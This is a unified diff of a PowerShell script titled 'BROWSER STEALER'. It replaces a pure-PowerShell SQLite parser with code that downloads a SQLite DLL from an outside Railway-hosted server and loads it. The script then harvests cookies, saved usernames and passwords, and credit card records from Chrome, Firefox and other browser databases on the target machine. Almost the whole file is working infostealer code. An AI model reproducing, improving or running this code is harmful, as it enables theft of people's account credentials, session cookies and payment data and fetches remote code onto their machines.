@@ -1,5 +1,5 @@
 # ============================================================
-# BROWSER STEALER — BINARY PARSER VERSION (No DLL Required)
+# BROWSER STEALER — DLL VERSION (Downloads from Your Server)
 # ============================================================
 
 $ErrorActionPreference = "Continue"
@@ -17,119 +17,115 @@ function Write-Log {
 }
 
 Write-Log "============================================"
-Write-Log "  BROWSER STEALER v4.0"
+Write-Log "  BROWSER STEALER v3.0"
 Write-Log "  Target: $env:COMPUTERNAME"
 Write-Log "  Log: $LOGFILE"
 Write-Log "============================================"
 Write-Log ""
 
 # ============================================================
-# SQLITE BINARY PARSER (PURE POWERSHELL)
+# DOWNLOAD SQLITE DLL FROM YOUR SERVER
 # ============================================================
 
-function Read-SQLite-Binary {
-    param($DbPath)
-    
-    if (-not (Test-Path $DbPath)) { return $null }
-    
-    try {
-        # Read the file as bytes
-        $bytes = [System.IO.File]::ReadAllBytes($DbPath)
-        
-        # Validate SQLite header
-        if ($bytes.Length -lt 20) { return $null }
-        $header = [System.Text.Encoding]::ASCII.GetString($bytes[0..15])
-        if (-not $header.StartsWith("SQLite format 3")) {
-            Write-Log "[-] Not a valid SQLite file: $DbPath"
-            return $null
-        }
-        
-        # Extract all text strings (null-terminated)
-        $strings = @()
-        $i = 0
-        while ($i -lt $bytes.Length) {
-            # Look for null terminator
-            if ($bytes[$i] -eq 0) {
-                $start = $i - 1
-                while ($start -gt 0 -and $bytes[$start] -ne 0) { $start-- }
-                $start++
-                
-                if ($i - $start -gt 1) {
-                    try {
-                        $str = [System.Text.Encoding]::UTF8.GetString($bytes[$start..($i-1)])
-                        # Filter valid strings
-                        if ($str -match '[\w@.-]' -and $str.Length -gt 2 -and $str.Length -lt 1000) {
-                            $strings += $str
-                        }
-                    } catch {}
-                }
-            }
-            $i++
-        }
-        
-        Write-Log "[+] Extracted $($strings.Count) strings from $DbPath"
-        return $strings
-    } catch {
-        Write-Log "[!] Error reading $DbPath: $_"
-        return $null
-    }
+$dllPath = "$env:TEMP\System.Data.SQLite.dll"
+
+# Clean up old DLL
+if (Test-Path $dllPath) {
+    Write-Log "[+] Removing old DLL"
+    Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
+}
+
+$dllUrl = "https://cipheranon-production.up.railway.app/System.Data.SQLite.dll"
+Write-Log "[+] Downloading SQLite DLL from: $dllUrl"
+
+try {
+    $webClient = New-Object System.Net.WebClient
+    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+    $webClient.DownloadFile($dllUrl, $dllPath)
+    Write-Log "[+] Download completed"
+} catch {
+    Write-Log "[!] Download failed: $_"
+    Write-Log "[!] Make sure you uploaded System.Data.SQLite.dll to your public folder"
+    Read-Host "Press Enter to exit"
+    exit
+}
+
+# Check if file exists and is large enough
+if (-not (Test-Path $dllPath)) {
+    Write-Log "[!] DLL not found after download"
+    Read-Host "Press Enter to exit"
+    exit
+}
+
+$fileSize = (Get-Item $dllPath).Length
+Write-Log "[+] File size: $fileSize bytes"
+
+if ($fileSize -lt 50000) {
+    Write-Log "[!] DLL is too small ($fileSize bytes) — not a valid DLL"
+    Write-Log "[!] Make sure you uploaded System.Data.SQLite.dll (not sqlite3.dll)"
+    Read-Host "Press Enter to exit"
+    exit
+}
+
+# Load the DLL
+Write-Log "[+] Loading SQLite DLL..."
+try {
+    [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
+    Write-Log "[+] SQLite loaded successfully!"
+} catch {
+    Write-Log "[!] Failed to load DLL: $_"
+    Write-Log "[!] Make sure you uploaded System.Data.SQLite.dll (the .NET assembly)"
+    Write-Log "[!] Not the native sqlite3.dll"
+    Read-Host "Press Enter to exit"
+    exit
+}
+
+# Test SQLite connection
+Write-Log "[+] Testing SQLite..."
+try {
+    $testConn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=:memory:")
+    $testConn.Open()
+    $testConn.Close()
+    Write-Log "[+] SQLite test passed!"
+} catch {
+    Write-Log "[!] SQLite test failed: $_"
+    Read-Host "Press Enter to exit"
+    exit
 }
 
 # ============================================================
-# EXTRACT COOKIES
+# SQLITE READER FUNCTION
 # ============================================================
 
-function Extract-Cookies {
-    param($Strings, $BrowserName)
-    $cookies = @()
-    
-    # First pass: find potential cookie domains
-    $domains = @()
-    $names = @()
-    $values = @()
-    
-    # Look for domain patterns
-    foreach ($str in $Strings) {
-        # Skip common non-cookie strings
-        if ($str -match '^[a-z]+$' -or $str -match '^[0-9]+$') { continue }
-        if ($str -match '^(host|name|value|path|expires|secure|httponly|sqlite|table|index|create|drop)$') { continue }
+function Read-SQLite {
+    param($DbPath, $Query)
+    $result = @()
+    if (-not (Test-Path $DbPath)) { return $result }
+    try {
+        $temp = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).tmp"
+        Copy-Item $DbPath $temp -Force
         
-        # Check if it's a domain
-        if ($str -match '([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})' -and $str -notmatch '[{}()\[\]]' -and $str.Length -lt 100) {
-            $domains += $str
-        }
-    }
-    
-    # Look for cookie names
-    foreach ($str in $Strings) {
-        if ($str.Length -lt 3 -or $str.Length -gt 50) { continue }
-        if ($str -match '^[a-zA-Z0-9_-]+$' -and $str -notmatch '^(host|name|value|path|expires|secure|httponly|sqlite|table|index|create|drop)$') {
-            $names += $str
-        }
-    }
-    
-    # Look for cookie values (longer strings with special chars)
-    foreach ($str in $Strings) {
-        if ($str.Length -lt 5 -or $str.Length -gt 500) { continue }
-        if ($str -match '[a-zA-Z0-9+/=_-]' -and $str -notmatch '^[a-z]+$' -and $str -notmatch '^[A-Z]+$') {
-            $values += $str
-        }
-    }
-    
-    # Match domains with names and values
-    $max = [Math]::Min($domains.Count, [Math]::Min($names.Count, $values.Count))
-    for ($i = 0; $i -lt $max; $i++) {
-        if ($domains[$i] -and $names[$i] -and $values[$i]) {
-            $cookies += @{
-                domain = $domains[$i] -replace '^\.', ''
-                name = $names[$i]
-                value = $values[$i]
-                browser = $BrowserName
+        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp;Version=3;")
+        $conn.Open()
+        $cmd = $conn.CreateCommand()
+        $cmd.CommandText = $Query
+        $rdr = $cmd.ExecuteReader()
+        while ($rdr.Read()) {
+            $row = @{}
+            for ($i=0; $i -lt $rdr.FieldCount; $i++) {
+                $n = $rdr.GetName($i)
+                $v = $rdr.GetValue($i)
+                if ($v -ne $null) { $row[$n] = $v }
             }
+            $result += $row
         }
+        $rdr.Close()
+        $conn.Close()
+        Remove-Item $temp -Force -ErrorAction SilentlyContinue
+    } catch {
+        Write-Log "[!] SQLite error reading $($DbPath): $_"
     }
-    
-    return $cookies
+    return $result
 }
 
 # ============================================================
@@ -139,18 +135,24 @@ function Extract-Cookies {
 function Get-BrowserCookies {
     param($Path, $Name)
     $cookies = @()
-    if (-not (Test-Path $Path)) { 
-        Write-Log "[-] No cookies file for $Name"
-        return $cookies 
-    }
+    if (-not (Test-Path $Path)) { return $cookies }
     
-    Write-Log "[+] Parsing $Name cookies..."
-    $strings = Read-SQLite-Binary -DbPath $Path
-    if ($strings -and $strings.Count -gt 10) {
-        $cookies = Extract-Cookies -Strings $strings -BrowserName $Name
-        Write-Log "[+] Found $($cookies.Count) $Name cookies"
-    } else {
-        Write-Log "[-] No data extracted from $Name"
+    try {
+        $rows = Read-SQLite -DbPath $Path -Query "SELECT host_key, name, value FROM cookies"
+        foreach ($r in $rows) {
+            if ($r['name'] -and $r['value']) {
+                $d = $r['host_key']
+                if ($d) { $d = $d -replace '^\.', '' } else { $d = "unknown" }
+                $cookies += @{
+                    domain = $d
+                    name = $r['name']
+                    value = $r['value']
+                    browser = $Name
+                }
+            }
+        }
+    } catch {
+        Write-Log "[!] Error reading $Name cookies: $_"
     }
     return $cookies
 }
@@ -163,10 +165,22 @@ function Get-FirefoxCookies {
         foreach ($d in $dirs) {
             $f = "$($d.FullName)\cookies.sqlite"
             if (Test-Path $f) {
-                Write-Log "[+] Parsing Firefox cookies from $($d.Name)..."
-                $strings = Read-SQLite-Binary -DbPath $f
-                if ($strings -and $strings.Count -gt 10) {
-                    $cookies += Extract-Cookies -Strings $strings -BrowserName "Firefox"
+                try {
+                    $rows = Read-SQLite -DbPath $f -Query "SELECT host, name, value FROM moz_cookies"
+                    foreach ($r in $rows) {
+                        if ($r['name'] -and $r['value']) {
+                            $dmn = $r['host']
+                            if ($dmn) { $dmn = $dmn -replace '^\.', '' } else { $dmn = "unknown" }
+                            $cookies += @{
+                                domain = $dmn
+                                name = $r['name']
+                                value = $r['value']
+                                browser = "Firefox"
+                            }
+                        }
+                    }
+                } catch {
+                    Write-Log "[!] Error reading Firefox cookies: $_"
                 }
             }
         }
@@ -175,7 +189,7 @@ function Get-FirefoxCookies {
 }
 
 # ============================================================
-# PASSWORD STEALER
+# PASSWORD FUNCTIONS
 # ============================================================
 
 function Get-BrowserPasswords {
@@ -184,51 +198,19 @@ function Get-BrowserPasswords {
     if (-not (Test-Path $Path)) { return $pass }
     
     try {
-        $bytes = [System.IO.File]::ReadAllBytes($Path)
-        $text = [System.Text.Encoding]::UTF8.GetString($bytes)
-        $lines = $text -split "`0"
-        
-        $url = ""; $user = ""; $passw = ""
-        
-        foreach ($line in $lines) {
-            # Find URLs
-            if ($line -match 'https?://([^/]+)') {
-                $url = $Matches[1]
-            }
-            # Find usernames
-            if ($line -match 'username[_-]?value[^=]*=([^,]+)') {
-                $user = $Matches[1] -replace '[^a-zA-Z0-9@._-]', ''
-                if ($user.Length -lt 3) {
-                    $user = ($line -replace '[^a-zA-Z0-9@._-]', '')
-                }
-            }
-            # Find passwords
-            if ($line -match 'password[_-]?value[^=]*=([^,]+)') {
-                $passw = $Matches[1] -replace '[^a-zA-Z0-9@._-]', ''
-                if ($passw.Length -lt 3) {
-                    $passw = ($line -replace '[^a-zA-Z0-9@._-]', '')
-                }
-            }
-            # Also try direct pattern matching
-            if ($line -match '"([^"]+)"\s*,\s*"([^"]+)"\s*,\s*"([^"]+)"') {
-                $url = $Matches[1] -replace 'https?://', ''
-                $user = $Matches[2]
-                $passw = $Matches[3]
-            }
-            
-            # If we have all three, add to results
-            if ($url -and $user -and $passw -and $user.Length -gt 1 -and $passw.Length -gt 1 -and $user -ne "username" -and $passw -ne "password") {
+        $rows = Read-SQLite -DbPath $Path -Query "SELECT origin_url, username_value, password_value FROM logins"
+        foreach ($r in $rows) {
+            if ($r['username_value'] -and $r['password_value']) {
+                $u = $r['origin_url']
+                if ($u) { $u = $u -replace 'https?://', '' } else { $u = "unknown" }
                 $pass += @{
-                    url = $url
-                    username = $user
-                    password = $passw
+                    url = $u
+                    username = $r['username_value']
+                    password = $r['password_value']
                     browser = $Name
                 }
-                $url = ""; $user = ""; $passw = ""
             }
         }
-        
-        Write-Log "[+] Found $($pass.Count) $Name passwords"
     } catch {
         Write-Log "[!] Error reading $Name passwords: $_"
     }
@@ -256,7 +238,9 @@ function Get-FirefoxPasswords {
                             }
                         }
                     }
-                } catch {}
+                } catch {
+                    Write-Log "[!] Error reading Firefox passwords: $_"
+                }
             }
         }
     }
@@ -273,7 +257,7 @@ function Get-OperaPasswords {
 }
 
 # ============================================================
-# CREDIT CARD STEALER
+# CREDIT CARD FUNCTIONS
 # ============================================================
 
 function Get-BrowserCards {
@@ -282,53 +266,18 @@ function Get-BrowserCards {
     if (-not (Test-Path $Path)) { return $cards }
     
     try {
-        $bytes = [System.IO.File]::ReadAllBytes($Path)
-        $text = [System.Text.Encoding]::UTF8.GetString($bytes)
-        $lines = $text -split "`0"
-        
-        $name = ""; $number = ""; $month = ""; $year = ""
-        
-        foreach ($line in $lines) {
-            # Find cardholder name
-            if ($line -match 'name[_-]?on[_-]?card[^=]*=([^,]+)') {
-                $name = $Matches[1]
-            }
-            # Find card number
-            if ($line -match 'card[_-]?number[_-]?[^=]*=([^,]+)') {
-                $number = $Matches[1]
-            }
-            # Find expiry month
-            if ($line -match 'expiration[_-]?month[^=]*=(\d+)') {
-                $month = $Matches[1]
-            }
-            # Find expiry year
-            if ($line -match 'expiration[_-]?year[^=]*=(\d+)') {
-                $year = $Matches[1]
-            }
-            
-            # Also look for card number patterns (4-digit groups)
-            if (-not $number) {
-                $cardMatch = [regex]::Match($line, '\b(\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4})\b')
-                if ($cardMatch.Success) {
-                    $number = $cardMatch.Groups[1].Value
-                    $name = "Unknown"
-                }
-            }
-            
-            # If we have name and number, add to results
-            if ($name -and $number -and $number.Length -gt 5) {
+        $rows = Read-SQLite -DbPath $Path -Query "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
+        foreach ($r in $rows) {
+            if ($r['name_on_card'] -and $r['card_number_encrypted']) {
                 $cards += @{
-                    name = $name
-                    number = $number
-                    month = $month
-                    year = $year
+                    name = $r['name_on_card']
+                    number = $r['card_number_encrypted']
+                    month = $r['expiration_month']
+                    year = $r['expiration_year']
                     browser = $Name
                 }
-                $name = ""; $number = ""; $month = ""; $year = ""
             }
         }
-        
-        Write-Log "[+] Found $($cards.Count) $Name cards"
     } catch {
         Write-Log "[!] Error reading $Name cards: $_"
     }
@@ -343,7 +292,6 @@ $allCookies = @()
 $allPasswords = @()
 $allCards = @()
 
-# ---- COOKIES ----
 Write-Log ""
 Write-Log "[+] Chrome cookies..."
 $path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
@@ -364,7 +312,6 @@ $allCookies += Get-BrowserCookies -Path $path -Name "Opera"
 Write-Log "[+] Firefox cookies..."
 $allCookies += Get-FirefoxCookies
 
-# ---- PASSWORDS ----
 Write-Log "[+] Chrome passwords..."
 $path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
 $allPasswords += Get-BrowserPasswords -Path $path -Name "Chrome"
@@ -383,7 +330,6 @@ $allPasswords += Get-OperaPasswords
 Write-Log "[+] Firefox passwords..."
 $allPasswords += Get-FirefoxPasswords
 
-# ---- CARDS ----
 Write-Log "[+] Chrome cards..."
 $path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"
 $allCards += Get-BrowserCards -Path $path -Name "Chrome"
@@ -410,7 +356,6 @@ Write-Log "Cards:      $($allCards.Count)"
 Write-Log "============================================"
 Write-Log ""
 
-# Show sample data if any
 if ($allCookies.Count -gt 0) {
     Write-Log "=== SAMPLE COOKIES (First 3) ==="
     $allCookies | Select-Object -First 3 | ForEach-Object {
